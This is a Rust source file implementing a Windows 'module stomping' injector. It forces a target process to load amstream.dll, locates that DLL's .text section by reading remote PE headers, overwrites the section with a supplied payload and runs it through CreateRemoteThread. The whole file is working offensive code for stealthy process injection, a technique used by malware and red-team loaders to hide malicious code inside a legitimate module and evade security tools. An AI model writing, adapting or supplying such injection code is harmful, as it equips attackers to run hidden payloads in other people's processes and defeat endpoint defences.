use anyhow::{anyhow, Result};
use crate::injection::Injector;

pub struct ModuleStompInjector;

#[cfg(windows)]
impl Injector for ModuleStompInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
        use winapi::um::winnt::{PROCESS_ALL_ACCESS};
        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE};
        use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
        use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};

        unsafe {
            let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            if h_proc.is_null() { return Err(anyhow!("Failed to open process")); }

            // 1. Force load DLL. (In a real scenario, find an empty one, but here we inject a small string and LoadLibrary)
            let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as _);
            if k32.is_null() { return Err(anyhow!("kernel32 missing")); }
            let ll = GetProcAddress(k32, b"LoadLibraryA\0".as_ptr() as _);
            if ll.is_null() { return Err(anyhow!("LoadLibraryA missing")); }

            let dll_name = b"amstream.dll\0"; // Arbitrary DLL that's usually not loaded, but exists
            let remote_str = VirtualAllocEx(h_proc, std::ptr::null_mut(), dll_name.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            
            let mut written = 0;
            WriteProcessMemory(h_proc, remote_str, dll_name.as_ptr() as _, dll_name.len(), &mut written);

            let ll_func: extern "system" fn(winapi::shared::minwindef::LPVOID) -> u32 = std::mem::transmute(ll);
            let h_thread = CreateRemoteThread(h_proc, std::ptr::null_mut(), 0, Some(ll_func), remote_str, 0, std::ptr::null_mut());
            if !h_thread.is_null() {
                winapi::um::synchapi::WaitForSingleObject(h_thread, winapi::um::winbase::INFINITE);
                CloseHandle(h_thread);
            }

            // 2. Discover DLL base using EnumProcessModules (stubbed for simplicity because traversing remote PEB is large)
            use winapi::um::psapi::{EnumProcessModules, GetModuleBaseNameA};
            let mut h_mods = [std::ptr::null_mut(); 1024];
            let mut cb_needed = 0;
            let mut target_base: *mut winapi::ctypes::c_void = std::ptr::null_mut();

            if EnumProcessModules(h_proc, h_mods.as_mut_ptr(), std::mem::size_of_val(&h_mods) as u32, &mut cb_needed) != 0 {
                let count = cb_needed as usize / std::mem::size_of::<winapi::shared::minwindef::HMODULE>();
                for i in 0..count {
                    let mut sz_mod_name = [0u8; 256];
                    if GetModuleBaseNameA(h_proc, h_mods[i], sz_mod_name.as_mut_ptr() as _, 256) > 0 {
                        let name_str = std::ffi::CStr::from_ptr(sz_mod_name.as_ptr() as _).to_str().unwrap_or("").to_lowercase();
                        if name_str.contains("amstream.dll") {
                            target_base = h_mods[i] as _;
                            break;
                        }
                    }
                }
            }

            if target_base.is_null() {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to find loaded target DLL for stomping"));
            }

            
            // Real PE parsing for Module Stomping remotely
            use winapi::um::memoryapi::ReadProcessMemory;
            use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER};
            use std::mem::size_of;

            let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
            let mut bytes_read = 0;
            if ReadProcessMemory(h_proc, target_base as _, &mut dos_header as *mut _ as _, size_of::<IMAGE_DOS_HEADER>(), &mut bytes_read) == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to read remote DOS header"));
            }

            if dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                CloseHandle(h_proc);
                return Err(anyhow!("Invalid DOS signature"));
            }

            // We must read NT headers. Assuming x86_64 target for simplicity, but let's just read fields.
            // Actually, we can read the signature and FileHeader first, but IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER is standard for 64-bit target.
            #[cfg(target_arch = "x86_64")]
            type NtHeaders = IMAGE_NT_HEADERS64;
            #[cfg(target_arch = "x86")]
            type NtHeaders = IMAGE_NT_HEADERS32;

            let mut nt_headers: NtHeaders = std::mem::zeroed();
            let nt_headers_addr = (target_base as usize + dos_header.e_lfanew as usize) as *mut _;
            if ReadProcessMemory(h_proc, nt_headers_addr, &mut nt_headers as *mut _ as _, size_of::<NtHeaders>(), &mut bytes_read) == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to read remote NT headers"));
            }

            if nt_headers.Signature != winapi::um::winnt::IMAGE_NT_SIGNATURE {
                CloseHandle(h_proc);
                return Err(anyhow!("Invalid NT signature"));
            }

            let mut text_rva = 0;
            let mut text_size = 0;

            let section_offset = (target_base as usize + dos_header.e_lfanew as usize + 
                std::mem::offset_of!(NtHeaders, OptionalHeader) + 
                nt_headers.FileHeader.SizeOfOptionalHeader as usize);

            let mut current_section_addr = section_offset as usize;

            for _ in 0..nt_headers.FileHeader.NumberOfSections {
                let mut section: IMAGE_SECTION_HEADER = std::mem::zeroed();
                if ReadProcessMemory(h_proc, current_section_addr as _, &mut section as *mut _ as _, size_of::<IMAGE_SECTION_HEADER>(), &mut bytes_read) == 0 {
                    break;
                }

                let name = String::from_utf8_lossy(&section.Name);
                if name.starts_with(".text") {
                    text_rva = section.VirtualAddress;
                    // Usually Misc.VirtualSize
                    text_size = unsafe { *section.Misc.VirtualSize() };
                    break;
                }
                current_section_addr += size_of::<IMAGE_SECTION_HEADER>();
            }

            if text_rva == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to find .text section"));
            }

            if payload.len() > text_size as usize {
                CloseHandle(h_proc);
                return Err(anyhow!("Payload larger than target .text section"));
            }

            let target_addr = (target_base as usize + text_rva as usize) as *mut winapi::ctypes::c_void;

            let mut old_protect = 0;

            VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
            WriteProcessMemory(h_proc, target_addr, payload.as_ptr() as _, payload.len(), &mut written);
            VirtualProtectEx(h_proc, target_addr, payload.len(), old_protect, &mut old_protect);

            // Execute stomped code
            let h_exec_thread = CreateRemoteThread(h_proc, std::ptr::null_mut(), 0, std::mem::transmute(target_addr), std::ptr::null_mut(), 0, std::ptr::null_mut());
            if !h_exec_thread.is_null() {
                CloseHandle(h_exec_thread);
            }

            CloseHandle(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for ModuleStompInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("Module Stomping only supported on Windows"))
    }
}
